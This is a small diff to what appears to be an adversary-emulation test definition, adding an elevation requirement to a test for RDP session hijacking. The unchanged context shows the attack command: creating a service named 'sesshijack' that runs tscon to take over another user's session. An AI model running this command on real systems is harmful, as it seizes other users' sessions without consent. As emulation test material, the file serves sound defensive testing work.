@@ -13,6 +13,7 @@ atomic_tests:
 
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       query user
       sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
